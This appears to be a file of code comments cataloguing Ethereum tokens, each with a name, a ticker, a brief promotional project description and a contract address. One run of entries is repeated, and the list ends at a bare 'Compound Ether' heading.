// 0x362bc847A3a9637d3af6624EeC853618a43ed7D2

// EthLend (LEND)
// Aave is an Open Source and Non-Custodial protocol to earn interest on deposits & borrow assets. It also features access to highly innovative flash loans, which let developers borrow instantly and easily; no collateral needed. With 16 different assets, 5 of which are stablecoins.
// 0x80fB784B7eD66730e8b1DBd9820aFD29931aab03

// QANX Token (QANX)
// Quantum-resistant hybrid blockchain platform. Build your software applications like DApps or DeFi and run business processes on blockchain in 5 minutes with QANplatform.
// 0xaaa7a10a8ee237ea61e8ac46c50a8db8bcc1baaa

// LockTrip (LOC)
// Hotel Booking & Vacation Rental Marketplace With 0% Commissions.
// 0x5e3346444010135322268a4630d2ed5f8d09446c

// BioPassport Coin (BIOT)
// BioPassport is committed to help make healthcare a personal component of our daily lives. This starts with a 'health passport' platform that houses a patient's DPHR, or decentralized personal health record built around DID (decentralized identity) technology.
// 0xc07A150ECAdF2cc352f5586396e344A6b17625EB

// MANTRA DAO (OM)
// MANTRA DAO is a community-governed DeFi platform focusing on Staking, Lending, and Governance.
// 0x3593d125a4f7849a1b059e64f4517a86dd60c95d

// Sai Stablecoin v1.0 (SAI)
// Sai is an asset-backed, hard currency for the 21st century. The first decentralized stablecoin on the Ethereum blockchain.
// 0x89d24a6b4ccb1b6faa2625fe562bdd9a23260359

// Rarible (RARI)
// Create and sell digital collectibles secured with blockchain.
// 0xfca59cd816ab1ead66534d82bc21e7515ce441cf

// BTRFLY (BTRFLY)
// 0xc0d4ceb216b3ba9c3701b291766fdcba977cec3a

// AVT (AVT)
// An open-source protocol that delivers the global standard for ticketing.
// 0x0d88ed6e74bbfd96b831231638b66c05571e824f

// Fusion (FSN)
// FUSION is a public blockchain devoting itself to creating an inclusive cryptofinancial platform by providing cross-chain, cross-organization, and cross-datasource smart contracts.
// 0xd0352a019e9ab9d757776f532377aaebd36fd541

// BarnBridge Governance Token (BOND)
// BarnBridge aims to offer a cross platform protocol for tokenizing risk.
// 0x0391D2021f89DC339F60Fff84546EA23E337750f

// Nuls (NULS)
// NULS is a blockchain built on an infrastructure optimized for customized services through the use of micro-services. The NULS blockchain is a public, global, open-source community project. NULS uses the micro-service functionality to implement a highly modularized underlying architecture.
// 0xa2791bdf2d5055cda4d46ec17f9f429568275047

// Pinakion (PNK)
// Kleros provides fast, secure and affordable arbitration for virtually everything.
// 0x93ed3fbe21207ec2e8f2d3c3de6e058cb73bc04d

// LON Token (LON)
// Tokenlon is a decentralized exchange and payment settlement protocol.
// 0x0000000000095413afc295d19edeb1ad7b71c952

// CargoX (CXO)
// CargoX aims to be the independent supplier of blockchain-based Smart B/L solutions that enable extremely fast, safe, reliable and cost-effective global Bill of Lading processing.
// 0xb6ee9668771a79be7967ee29a63d4184f8097143

// Wrapped NXM (wNXM)
// Blockchain based solutions for smart contract cover.
// 0x0d438f3b5175bebc262bf23753c1e53d03432bde

// Bytom (BTM)
// Transfer assets from atomic world to byteworld
// 0xcb97e65f07da24d46bcdd078ebebd7c6e6e3d750

// Internxt (INXT)
// Internxt is working on building a private Internet. Internxt Drive is a decentralized cloud storage service available for individuals and businesses.
// 0x4a8f5f96d5436e43112c2fbc6a9f70da9e4e16d4


// Vader (VADER)
// Swap, LP, borrow, lend, mint interest-bearing synths, and more, in a fairly distributed, governance-minimal protocol built to last.
// 0x2602278ee1882889b946eb11dc0e810075650983


// Launchpool token (LPOOL)
// Launchpool believes investment funds and communities work side by side on projects, on the same terms, towards the same goals. Launchpool aims to harness their strengths and aligns their incentives, the sum is greater than its constituent parts.
// 0x6149c26cd2f7b5ccdb32029af817123f6e37df5b


// Unido (UDO)
// Unido is a technology ecosystem that addresses the governance, security and accessibility challenges of decentralized applications - enabling enterprises to manage crypto assets and capitalize on DeFi.
// 0xea3983fc6d0fbbc41fb6f6091f68f3e08894dc06


// YOU Chain (YOU)
// YOUChain will create a public infrastructure chain that all people can participate, produce personal virtual items and trade personal virtual items on their own.
// 0x34364BEe11607b1963d66BCA665FDE93fCA666a8


// RUFF (RUFF)
// Decentralized open source blockchain architecture for high efficiency Internet of Things application development
// 0xf278c1ca969095ffddded020290cf8b5c424ace2



// OddzToken (ODDZ)
// Oddz Protocol is an On-Chain Option trading platform that expedites the execution of options contracts, conditional trades, and futures. It allows the creation, maintenance, execution, and settlement of trustless options, conditional tokens, and futures in a fast, secure, and flexible manner.
// 0xcd2828fc4d8e8a0ede91bb38cf64b1a81de65bf6


// DIGITAL FITNESS (DEFIT)
// Digital Fitness is a groundbreaking decentralised fitness platform powered by its native token DEFIT connecting people with Health and Fitness professionals worldwide. Pioneer in gamification of the Fitness industry with loyalty rewards and challenges for competing and staying fit and healthy.
// 0x84cffa78b2fbbeec8c37391d2b12a04d2030845e


// UCOT (UCT)
// Ubique Chain Of Things (UCT) is utility token and operates on its own platform which combines IOT and blockchain technologies in supply chain industries.
// 0x3c4bEa627039F0B7e7d21E34bB9C9FE962977518

// VIN (VIN)
// Complete vehicle data all in one marketplace - making automotive more secure, transparent and accessible by all
// 0xf3e014fe81267870624132ef3a646b8e83853a96

// Aurora (AOA)
// Aurora Chain offers intelligent application isolation and enables multi-chain parallel expansion to create an extremely high TPS with security maintain.
// 0x9ab165d795019b6d8b3e971dda91071421305e5a


// Egretia (EGT)
// HTML5 Blockchain Engine and Platform
// 0x8e1b448ec7adfc7fa35fc2e885678bd323176e34


// Standard (STND)
// Standard Protocol is a Collateralized Rebasable Stablecoins (CRS) protocol for synthetic assets that will operate in the Polkadot ecosystem
// 0x9040e237c3bf18347bb00957dc22167d0f2b999d


// TrueFlip (TFL)
// Blockchain games with instant payouts and open source code,
// 0xa7f976c360ebbed4465c2855684d1aae5271efa9


// Strips Token (STRP)
// Strips makes it easy for traders and investors to trade interest rates using a derivatives instrument called a perpetual interest rate swap (perpetual IRS). Strips is a decentralised interest rate derivatives exchange built on the Ethereum layer 2 Arbitrum.
// 0x97872eafd79940c7b24f7bcc1eadb1457347adc9


// Decentr (DEC)
// Decentr is a publicly accessible, open-source blockchain protocol that targets the consumer crypto loans market, securing user data, and returning data value to the user.
// 0x30f271C9E86D2B7d00a6376Cd96A1cFBD5F0b9b3


// Jigstack (STAK)
// Jigstack is an Ethereum-based DAO with a conglomerate structure. Its purpose is to govern a range of high-quality DeFi products. Additionally, the infrastructure encompasses a single revenue and governance feed, orchestrated via the native $STAK token.
// 0x1f8a626883d7724dbd59ef51cbd4bf1cf2016d13


// CoinUs (CNUS)
// CoinUs is a integrated business platform with focus on individual's value and experience to provide Human-to-Blockchain Interface.
// 0x722f2f3eac7e9597c73a593f7cf3de33fbfc3308


// qiibeeToken (QBX)
// The global standard for loyalty on the blockchain. With qiibee, businesses around the world can run their loyalty programs on the blockchain.
// 0x2467aa6b5a2351416fd4c3def8462d841feeecec


// Digix Gold Token (DGX)
// Gold Backed Tokens
// 0x4f3afec4e5a3f2a6a1a411def7d7dfe50ee057bf


// aXpire (AXPR)
// The aXpire project is comprised of a number of business-to-business (B2B) software platforms as well as business-to-consumer (B2C) applications. As its mission, aXpire is focused on software for businesses that helps them automate outdated tasks, increasing efficiency, and profitability.
// 0xdD0020B1D5Ba47A54E2EB16800D73Beb6546f91A


// SpaceChain (SPC)
// SpaceChain is a community-based space platform that combines space and blockchain technologies to build the world’s first open-source blockchain-based satellite network.
// 0x8069080a922834460c3a092fb2c1510224dc066b


// COS (COS)
// One-stop shop for all things crypto: an exchange, an e-wallet which supports a broad variety of tokens, a platform for ICO launches and promotional trading campaigns, a fiat gateway, a market cap widget, and more
// 0x7d3cb11f8c13730c24d01826d8f2005f0e1b348f


// Arcona Distribution Contract (ARCONA)
// Arcona - X Reality Metaverse aims to bring together the virtual and real worlds. The Arcona X Reality environment generate new forms of reality by bringing digital objects into the physical world and bringing physical world objects into the digital world
// 0x0f71b8de197a1c84d31de0f1fa7926c365f052b3



// Posscoin (POSS)
// Posscoin is an innovative payment network and a new kind of money.
// 0x6b193e107a773967bd821bcf8218f3548cfa2503



// Internet Node Token (INT)
// IOT applications
// 0x0b76544f6c413a555f309bf76260d1e02377c02a

// PayPie (PPP)
// PayPie platform brings ultimate trust and transparency to the financial markets by introducing the world’s first risk score algorithm based on business accounting.
// 0xc42209aCcC14029c1012fB5680D95fBd6036E2a0


// Impermax (IMX)
// Impermax is a DeFi ecosystem that enables liquidity providers to leverage their LP tokens.
// 0x7b35ce522cb72e4077baeb96cb923a5529764a00


// 1-UP (1-UP)
// 1up is an NFT powered, 2D gaming platform that aims to decentralize battle-royale style tournaments for the average gamer, allowing them to earn.
// 0xc86817249634ac209bc73fca1712bbd75e37407d


// Centra (CTR)
// Centra PrePaid Cryptocurrency Card
// 0x96A65609a7B84E8842732DEB08f56C3E21aC6f8a


// NFT INDEX (NFTI)
// The NFT Index is a digital asset index designed to track tokens’ performance within the NFT industry. The index is weighted based on the value of each token’s circulating supply.
// 0xe5feeac09d36b18b3fa757e5cf3f8da6b8e27f4c

// Own (CHX)
// Own (formerly Chainium) is a security token blockchain project focused on revolutionising equity markets.
// 0x1460a58096d80a50a2f1f956dda497611fa4f165


// Cindicator (CND)
// Hybrid Intelligence for effective asset management.
// 0xd4c435f5b09f855c3317c8524cb1f586e42795fa


// ASIA COIN (ASIA)
// Asia Coin(ASIA) is the native token of Asia Exchange and aiming to be widely used in Asian markets among diamond-Gold and crypto dealers. AsiaX is now offering crypto trading combined with 260,000+ loose diamonds stock.
// 0xf519381791c03dd7666c142d4e49fd94d3536011
	

// 1World (1WO)
// 1World is first of its kind media token and new generation Adsense. 1WO is used for increasing user engagement by sharing 10% ads revenue with participants and for buying ads.
// 0xfdbc1adc26f0f8f8606a5d63b7d3a3cd21c22b23

// Insights Network (INSTAR)
// The Insights Network’s unique combination of blockchain technology, smart contracts, and secure multiparty computation enables the individual to securely own, manage, and monetize their data.
// 0xc72fe8e3dd5bef0f9f31f259399f301272ef2a2d
	

// Cryptonovae (YAE)
// Cryptonovae is an all-in-one multi-exchange trading ecosystem to manage digital assets across centralized and decentralized exchanges. It aims to provide a sophisticated trading experience through advanced charting features and trade management.
// 0x4ee438be38f8682abb089f2bfea48851c5e71eaf

// CPChain (CPC)
// CPChain is a new distributed infrastructure for next generation Internet of Things (IoT).
// 0xfAE4Ee59CDd86e3Be9e8b90b53AA866327D7c090


// ZAP TOKEN (ZAP)
// Zap project is a suite of tools for creating smart contract oracles and a marketplace to find and subscribe to existing data feeds that have been oraclized
// 0x6781a0f84c7e9e846dcb84a9a5bd49333067b104


// Genaro X (GNX)
// The Genaro Network is the first Turing-complete public blockchain combining peer-to-peer storage with a sustainable consensus mechanism. Genaro's mixed consensus uses SPoR and PoS, ensuring stronger performance and security.
// 0x6ec8a24cabdc339a06a172f8223ea557055adaa5

// PILLAR (PLR)
// A cryptocurrency and token wallet that aims to become the dashboard for its users' digital life.
// 0xe3818504c1b32bf1557b16c238b2e01fd3149c17


// Falcon (FNT)
// Falcon Project it's a DeFi ecosystem which includes two completely interchangeable blockchains - ERC-20 token on the Ethereum and private Falcon blockchain. Falcon Project offers its users the right to choose what suits them best at the moment: speed and convenience or anonymity and privacy.
// 0xdc5864ede28bd4405aa04d93e05a0531797d9d59


// MATRIX AI Network (MAN)
// Aims to be an open source public intelligent blockchain platform
// 0xe25bcec5d3801ce3a794079bf94adf1b8ccd802d


// Genesis Vision (GVT)
// A platform for the private trust management market, built on Blockchain technology and Smart Contracts.
// 0x103c3A209da59d3E7C4A89307e66521e081CFDF0

// CarLive Chain (IOV)
// CarLive Chain is a vertical application of blockchain technology in the field of vehicle networking. It provides services to 1.3 billion vehicle users worldwide and the trillion-dollar-scale automobile consumer market.
// 0x0e69d0a2bbb30abcb7e5cfea0e4fde19c00a8d47


// Pawthereum (PAWTH)
// Pawthereum is a cryptocurrency project with animal welfare charitable fundamentals at its core. It aims to give back to animal shelters and be a digital advocate for animals in need.
// 0xaecc217a749c2405b5ebc9857a16d58bdc1c367f


// Furucombo (COMBO)
// Furucombo is a tool built for end-users to optimize their DeFi strategy simply by drag and drop. It visualizes complex DeFi protocols into cubes. Users setup inputs/outputs and the order of the cubes (a “combo”), then Furucombo bundles all the cubes into one transaction and sends them out.
// 0xffffffff2ba8f66d4e51811c5190992176930278


// Xaurum (Xaurum)
// Xaurum is unit of value on the golden blockchain, it represents an increasing amount of gold and can be exchanged for it by melting
// 0x4DF812F6064def1e5e029f1ca858777CC98D2D81
	

// Plasma (PPAY)
// PPAY is designed as the all-in-one defi service token combining access, rewards, staking and governance functions.
	// 0x054D64b73d3D8A21Af3D764eFd76bCaA774f3Bb2

// Digg (DIGG)
// Digg is an elastic bitcoin-pegged token and governed by BadgerDAO.
// 0x798d1be841a82a273720ce31c822c61a67a601c3


// OriginSport Token (ORS)
// A blockchain based sports betting platform
// 0xeb9a4b185816c354db92db09cc3b50be60b901b6


// WePower (WPR)
// Blockchain Green energy trading platform
// 0x4CF488387F035FF08c371515562CBa712f9015d4


// Monetha (MTH)
// Trusted ecommerce.
// 0xaf4dce16da2877f8c9e00544c93b62ac40631f16


// BitSpawn Token (SPWN)
// Bitspawn is a gaming blockchain protocol aiming to give gamers new revenue streams.
// 0xe516d78d784c77d479977be58905b3f2b1111126

// NEXT (NEXT)
// A hybrid exchange registered as an N. V. (Public company) in the Netherlands and provides fiat pairs to all altcoins on its platform
// 0x377d552914e7a104bc22b4f3b6268ddc69615be7

// UREEQA Token (URQA)
// UREEQA is a platform for Protecting, Managing and Monetizing creative work.
// 0x1735db6ab5baa19ea55d0adceed7bcdc008b3136


// Eden Coin (EDN)
// EdenChain is a blockchain platform that allows for the capitalization of any and every tangible and intangible asset such as stocks, bonds, real estate, and commodities amongst many others.
// 0x89020f0D5C5AF4f3407Eb5Fe185416c457B0e93e
	

// PieDAO DOUGH v2 (DOUGH)
// DOUGH is the PieDAO governance token. Owning DOUGH makes you a member of PieDAO. Holders are capable of participating in the DAO’s governance votes and proposing votes of their own.
// 0xad32A8e6220741182940c5aBF610bDE99E737b2D
	

// cVToken (cV)
// Decentralized car history registry built on blockchain.
// 0x50bC2Ecc0bfDf5666640048038C1ABA7B7525683


// CrowdWizToken (WIZ)
// Democratize the investing process by eliminating intermediaries and placing the power and control where it belongs - entirely into the hands of investors.
// 0x2f9b6779c37df5707249eeb3734bbfc94763fbe2


// Aluna (ALN)
// Aluna.Social is a gamified social trading terminal able to manage multiple exchange accounts, featuring a transparent social environment to learn from experts and even mirror trades. Aluna's vision is to gamify finance and create the ultimate social trading experience for a Web 3.0 world.
// 0x8185bc4757572da2a610f887561c32298f1a5748


// Gas DAO (GAS)
// Gas DAO’s purpose is simple: to be the heartbeat and voice of the Ethereum network’s active users through on and off-chain governance, launched as a decentralized autonomous organization with a free and fair initial distribution 100x bigger than the original DAO.
// 0x6bba316c48b49bd1eac44573c5c871ff02958469
	

// Hiveterminal Token (HVN)
// A blockchain based platform providing you fast and low-cost liquidity.
// 0xC0Eb85285d83217CD7c891702bcbC0FC401E2D9D


// EXRP Network (EXRN)
// Connecting the blockchains using crosschain gateway built with smart contracts.
// 0xe469c4473af82217b30cf17b10bcdb6c8c796e75

// Neumark (NEU)
// Neufund’s Equity Token Offerings (ETOs) open the possibility to fundraise on Blockchain, with legal and technical framework done for you.
// 0xa823e6722006afe99e91c30ff5295052fe6b8e32


// Bloom (BLT)
// Decentralized credit scoring powered by Ethereum and IPFS.
// 0x107c4504cd79c5d2696ea0030a8dd4e92601b82e


// IONChain Token (IONC)
// Through IONChain Protocol, IONChain will serve as the link between IoT devices, supporting decentralized peer-to-peer application interaction between devices.
// 0xbc647aad10114b89564c0a7aabe542bd0cf2c5af


// Voice Token (VOICE)
// Voice is the governance token of Mute.io that makes cryptocurrency and DeFi trading more accessible to the masses.
// 0x2e2364966267B5D7D2cE6CD9A9B5bD19d9C7C6A9


// Snetwork (SNET)
// Distributed Shared Cloud Computing Network
// 0xff19138b039d938db46bdda0067dc4ba132ec71c


// AMLT (AMLT)
// The Coinfirm AMLT token solves AML/CTF needs for cryptocurrency and blockchain-related companies and allows for the safe adoption of cryptocurrencies and blockchain by players in the traditional economy.
// 0xca0e7269600d353f70b14ad118a49575455c0f2f


// LibraToken (LBA)
// Decentralized lending infrastructure facilitating open access to credit networks on Ethereum.
// 0xfe5f141bf94fe84bc28ded0ab966c16b17490657


// GAT (GAT)
// GATCOIN aims to transform traditional discount coupons, loyalty points and shopping vouchers into liquid, tradable digital tokens.
// 0x687174f8c49ceb7729d925c3a961507ea4ac7b28


// Tadpole (TAD)
// Tadpole Finance is an open-source platform providing decentralized finance services for saving and lending. Tadpole Finance is an experimental project to create a more open lending market, where users can make deposits and loans with any ERC20 tokens on the Ethereum network.
// 0x9f7229aF0c4b9740e207Ea283b9094983f78ba04


// Hacken (HKN)
// Global Tokenized Business with Operating Cybersecurity Products.
// 0x9e6b2b11542f2bc52f3029077ace37e8fd838d7f


// DeFiner (FIN)
// DeFiner is a non-custodial digital asset platform with a true peer-to-peer network for savings, lending, and borrowing all powered by blockchain technology.
// 0x054f76beED60AB6dBEb23502178C52d6C5dEbE40
	

// XIO Network (XIO)
// Blockzero is a decentralized autonomous accelerator that helps blockchain projects reach escape velocity. Users can help build, scale, and own the next generation of decentralized projects at blockzerolabs.io.
// 0x0f7F961648aE6Db43C75663aC7E5414Eb79b5704


// Autonio (NIOX)
// Autonio Foundation is a DAO that develops decentralized and comprehensive financial technology for the crypto economy to make it easier for crypto traders to conduct trading analysis, deploy trading algorithms, copy successful traders and exchange cryptocurrencies.
// 0xc813EA5e3b48BEbeedb796ab42A30C5599b01740


// Hydro Protocol (HOT)
// A network transport layer protocol for hybrid decentralized exchanges.
// 0x9af839687f6c94542ac5ece2e317daae355493a1


// Humaniq (HMQ)
// Humaniq aims to be a simple and secure 4th generation mobile bank.
// 0xcbcc0f036ed4788f63fc0fee32873d6a7487b908


// Signata (SATA)
// The Signata project aims to deliver a full suite of blockchain-powered identity and access control solutions, including hardware token integration and a marketplace of smart contracts for integration with 3rd party service providers.
// 0x3ebb4a4e91ad83be51f8d596533818b246f4bee1


// Mothership (MSP)
// Cryptocurrency exchange built from the ground up to support cryptocurrency traders with fiat pairs.
// 0x68AA3F232dA9bdC2343465545794ef3eEa5209BD
	

// FLIP (FLP)
// FLIP CRYPTO-TOKEN FOR GAMERS FROM GAMING EXPERTS
// 0x3a1bda28adb5b0a812a7cf10a1950c920f79bcd3


// Fair Token (FAIR)
// Fair.Game is a fair game platform based on blockchain technology.
// 0x9b20dabcec77f6289113e61893f7beefaeb1990a
	

// OCoin (OCN)
// ODYSSEY’s mission is to build the next-generation decentralized sharing economy & Peer to Peer Ecosystem.
// 0x4092678e4e78230f46a1534c0fbc8fa39780892b


// Zloadr Token (ZDR)
// A fully-transparent crypto due diligence token provides banks, investors and financial institutions with free solid researched information; useful and reliable when providing loans, financial assistance or making investment decisions on crypto-backed properties and assets.
// 0xbdfa65533074b0b23ebc18c7190be79fa74b30c2

// Unimex Network (UMX)
// UniMex is a Uniswap based borrowing platform which facilitates the margin trading of native Uniswap assets.
// 0x10be9a8dae441d276a5027936c3aaded2d82bc15


// Vibe Coin (VIBE)
// Crypto Based Virtual / Augmented Reality Marketplace & Hub.
// 0xe8ff5c9c75deb346acac493c463c8950be03dfba
	

// Gro DAO Token (GRO)
// Gro is a stablecoin yield optimizer that enables leverage and protection through risk tranching. It splits yield and risk into two symbiotic products; Gro Vault and PWRD Stablecoin.
// 0x3ec8798b81485a254928b70cda1cf0a2bb0b74d7


// Zippie (ZIPT)
// Zippie enables your business to send and receive programmable payments with money and other digital assets like airtime, loyalty points, tokens and gift cards.
// 0xedd7c94fd7b4971b916d15067bc454b9e1bad980


// Sharpay (S)
// Sharpay is the share button with blockchain profit
// 0x96b0bf939d9460095c15251f71fda11e41dcbddb


// Bundles (BUND)
// Bundles is a DEFI project that challenges token holders against each other to own the most $BUND.
// 0x8D3E855f3f55109D473735aB76F753218400fe96


// ATN (ATN)
// ATN is a global artificial intelligence API marketplace where developers, technology suppliers and buyers come together to access and develop new and innovative forms of A.I. technology.
// 0x461733c17b0755ca5649b6db08b3e213fcf22546


// Empty Set Dollar (ESD)
// ESD is a stablecoin built to be the reserve currency of decentralized finance.
// 0x36F3FD68E7325a35EB768F1AedaAe9EA0689d723


// renDOGE (renDOGE)
// renDOGE is a one-for-one representation of Dogecoin (DOGE) on Ethereum via RenVM.
// 0x3832d2F059E55934220881F831bE501D180671A7


// BOB Token (BOB)
// Using Blockchain to eliminate review fraud and provide lower pricing in the home repair industry through a decentralized platform.
// 0xDF347911910b6c9A4286bA8E2EE5ea4a39eB2134

// Fair Token (FAIR)
// Fair.Game is a fair game platform based on blockchain technology.
// 0x9b20dabcec77f6289113e61893f7beefaeb1990a
	

// OCoin (OCN)
// ODYSSEY’s mission is to build the next-generation decentralized sharing economy & Peer to Peer Ecosystem.
// 0x4092678e4e78230f46a1534c0fbc8fa39780892b


// Zloadr Token (ZDR)
// A fully-transparent crypto due diligence token provides banks, investors and financial institutions with free solid researched information; useful and reliable when providing loans, financial assistance or making investment decisions on crypto-backed properties and assets.
// 0xbdfa65533074b0b23ebc18c7190be79fa74b30c2

// Unimex Network (UMX)
// UniMex is a Uniswap based borrowing platform which facilitates the margin trading of native Uniswap assets.
// 0x10be9a8dae441d276a5027936c3aaded2d82bc15


// Vibe Coin (VIBE)
// Crypto Based Virtual / Augmented Reality Marketplace & Hub.
// 0xe8ff5c9c75deb346acac493c463c8950be03dfba
	

// Gro DAO Token (GRO)
// Gro is a stablecoin yield optimizer that enables leverage and protection through risk tranching. It splits yield and risk into two symbiotic products; Gro Vault and PWRD Stablecoin.
// 0x3ec8798b81485a254928b70cda1cf0a2bb0b74d7


// Zippie (ZIPT)
// Zippie enables your business to send and receive programmable payments with money and other digital assets like airtime, loyalty points, tokens and gift cards.
// 0xedd7c94fd7b4971b916d15067bc454b9e1bad980


// Sharpay (S)
// Sharpay is the share button with blockchain profit
// 0x96b0bf939d9460095c15251f71fda11e41dcbddb


// Bundles (BUND)
// Bundles is a DEFI project that challenges token holders against each other to own the most $BUND.
// 0x8D3E855f3f55109D473735aB76F753218400fe96


// ATN (ATN)
// ATN is a global artificial intelligence API marketplace where developers, technology suppliers and buyers come together to access and develop new and innovative forms of A.I. technology.
// 0x461733c17b0755ca5649b6db08b3e213fcf22546


// Empty Set Dollar (ESD)
// ESD is a stablecoin built to be the reserve currency of decentralized finance.
// 0x36F3FD68E7325a35EB768F1AedaAe9EA0689d723


// renDOGE (renDOGE)
// renDOGE is a one-for-one representation of Dogecoin (DOGE) on Ethereum via RenVM.
// 0x3832d2F059E55934220881F831bE501D180671A7


// BOB Token (BOB)
// Using Blockchain to eliminate review fraud and provide lower pricing in the home repair industry through a decentralized platform.
// 0xDF347911910b6c9A4286bA8E2EE5ea4a39eB2134  

// BNB (BNB)
// Binance aims to build a world-class crypto exchange, powering the future of crypto finance.
// 0xB8c77482e45F1F44dE1745F52C74426C631bDD52

// Tether USD (USDT)
// Tether gives you the joint benefits of open blockchain technology and traditional currency by converting your cash into a stable digital currency equivalent.
// 0xdac17f958d2ee523a2206206994597c13d831ec7

// USD Coin (USDC)
// USDC is a fully collateralized US Dollar stablecoin developed by CENTRE, the open source project with Circle being the first of several forthcoming issuers.
// 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48

// Binance USD (BUSD)
// Binance USD (BUSD) is a dollar-backed stablecoin issued and custodied by Paxos Trust Company, and regulated by the New York State Department of Financial Services. BUSD is available directly for sale 1:1 with USD on Paxos.com and will be listed for trading on Binance.
// 0x4fabb145d64652a948d72533023f6e7a623c7c53

// Dai Stablecoin (DAI)
// Multi-Collateral Dai, brings a lot of new and exciting features, such as support for new CDP collateral types and Dai Savings Rate.
// 0x6b175474e89094c44da98b954eedeac495271d0f

// Theta Token (THETA)
// A decentralized peer-to-peer network that aims to offer improved video delivery at lower costs.
// 0x3883f5e181fccaf8410fa61e12b59bad963fb645

// HEX (HEX)
// HEX.com averages 25% APY interest recently. HEX virtually lends value from stakers to non-stakers as staking reduces supply. The launch ends Nov. 19th, 2020 when HEX stakers get credited ~200B HEX. HEX's total supply is now ~350B. Audited 3 times, 2 security, and 1 economics.
// 0x2b591e99afe9f32eaa6214f7b7629768c40eeb39

// Wrapped BTC (WBTC)
// Wrapped Bitcoin (WBTC) is an ERC20 token backed 1:1 with Bitcoin. Completely transparent. 100% verifiable. Community led.
// 0x2260fac5e5542a773aa44fbcfedf7c193bc2c599

// Bitfinex LEO Token (LEO)
// A utility token designed to empower the Bitfinex community and provide utility for those seeking to maximize the output and capabilities of the Bitfinex trading platform.
// 0x2af5d2ad76741191d15dfe7bf6ac92d4bd912ca3

// SHIBA INU (SHIB)
// SHIBA INU is a 100% decentralized community experiment with it claims that 1/2 the tokens have been sent to Vitalik and the other half were locked to a Uniswap pool and the keys burned.
// 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE

// stETH (stETH)
// stETH is a token that represents staked ether in Lido, combining the value of initial deposit + staking rewards. stETH tokens are pegged 1:1 to the ETH staked with Lido and can be used as one would use ether, allowing users to earn Eth2 staking rewards whilst benefiting from Defi yields.
// 0xae7ab96520de3a18e5e111b5eaab095312d7fe84

// Matic Token (MATIC)
// Matic Network brings massive scale to Ethereum using an adapted version of Plasma with PoS based side chains. Polygon is a well-structured, easy-to-use platform for Ethereum scaling and infrastructure development.
// 0x7d1afa7b718fb893db30a3abc0cfc608aacfebb0

// ChainLink Token (LINK)
// A blockchain-based middleware, acting as a bridge between cryptocurrency smart contracts, data feeds, APIs and traditional bank account payments.
// 0x514910771af9ca656af840dff83e8264ecf986ca

// Cronos Coin (CRO)
// Pay and be paid in crypto anywhere, with any crypto, for free.
// 0xa0b73e1ff0b80914ab6fe0444e65848c4c34450b

// OKB (OKB)
// Digital Asset Exchange
// 0x75231f58b43240c9718dd58b4967c5114342a86c

// Chain (XCN)
// Chain is a cloud blockchain protocol that enables organizations to build better financial services from the ground up powered by Sequence and Chain Core.
// 0xa2cd3d43c775978a96bdbf12d733d5a1ed94fb18

// Uniswap (UNI)
// UNI token served as governance token for Uniswap protocol with 1 billion UNI have been minted at genesis. 60% of the UNI genesis supply is allocated to Uniswap community members and remaining for team, investors and advisors.
// 0x1f9840a85d5af5bf1d1762f925bdaddc4201f984

// VeChain (VEN)
// Aims to connect blockchain technology to the real world by as well as advanced IoT integration.
// 0xd850942ef8811f2a866692a623011bde52a462c1

// Frax (FRAX)
// Frax is a fractional-algorithmic stablecoin protocol. It aims to provide a highly scalable, decentralized, algorithmic money in place of fixed-supply assets like BTC. Additionally, FXS is the value accrual and governance token of the entire Frax ecosystem.
// 0x853d955acef822db058eb8505911ed77f175b99e

// TrueUSD (TUSD)
// A regulated, exchange-independent stablecoin backed 1-for-1 with US Dollars.
// 0x0000000000085d4780B73119b644AE5ecd22b376

// Wrapped Decentraland MANA (wMANA)
// The Wrapped MANA token is not transferable and has to be unwrapped 1:1 back to MANA to transfer it. This token is also not burnable or mintable (except by wrapping more tokens).
// 0xfd09cf7cfffa9932e33668311c4777cb9db3c9be

// Wrapped Filecoin (WFIL)
// Wrapped Filecoin is an Ethereum based representation of Filecoin.
// 0x6e1A19F235bE7ED8E3369eF73b196C07257494DE

// SAND (SAND)
// The Sandbox is a virtual world where players can build, own, and monetize their gaming experiences in the Ethereum blockchain using SAND, the platform’s utility token.
// 0x3845badAde8e6dFF049820680d1F14bD3903a5d0

// KuCoin Token (KCS)
// KCS performs as the key to the entire KuCoin ecosystem, and it will also be the native asset on KuCoin’s decentralized financial services as well as the governance token of KuCoin Community.
// 0xf34960d9d60be18cc1d5afc1a6f012a723a28811

// Compound USD Coin (cUSDC)
// Compound is an open-source protocol for algorithmic, efficient Money Markets on the Ethereum blockchain.
// 0x39aa39c021dfbae8fac545936693ac917d5e7563

// Pax Dollar (USDP)
// Pax Dollar (USDP) is a digital dollar redeemable one-to-one for US dollars and regulated by the New York Department of Financial Services.
// 0x8e870d67f660d95d5be530380d0ec0bd388289e1

// HuobiToken (HT)
// Huobi Global is a world-leading cryptocurrency financial services group.
// 0x6f259637dcd74c767781e37bc6133cd6a68aa161

// Huobi BTC (HBTC)
// HBTC is a standard ERC20 token backed by 100% BTC. While maintaining the equivalent value of Bitcoin, it also has the flexibility of Ethereum. A bridge between the centralized market and the DeFi market.
// 0x0316EB71485b0Ab14103307bf65a021042c6d380

// Maker (MKR)
// Maker is a Decentralized Autonomous Organization that creates and insures the dai stablecoin on the Ethereum blockchain
// 0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2

// Graph Token (GRT)
// The Graph is an indexing protocol and global API for organizing blockchain data and making it easily accessible with GraphQL.
// 0xc944e90c64b2c07662a292be6244bdf05cda44a7

// BitTorrent (BTT)
// BTT is the official token of BitTorrent Chain, mapped from BitTorrent Chain at a ratio of 1:1. BitTorrent Chain is a brand-new heterogeneous cross-chain interoperability protocol, which leverages sidechains for the scaling of smart contracts.
// 0xc669928185dbce49d2230cc9b0979be6dc797957

// Decentralized USD (USDD)
// USDD is a fully decentralized over-collateralization stablecoin.
// 0x0C10bF8FcB7Bf5412187A595ab97a3609160b5c6

// Quant (QNT)
// Blockchain operating system that connects the world’s networks and facilitates the development of multi-chain applications.
// 0x4a220e6096b25eadb88358cb44068a3248254675

// Compound Dai (cDAI)
// Compound is an open-source, autonomous protocol built for developers, to unlock a universe of new financial applications. Interest and borrowing, for the open financial system.
// 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643

// Paxos Gold (PAXG)
// PAX Gold (PAXG) tokens each represent one fine troy ounce of an LBMA-certified, London Good Delivery physical gold bar, secured in Brink’s vaults.
// 0x45804880De22913dAFE09f4980848ECE6EcbAf78

// Compound Ether (cETH)
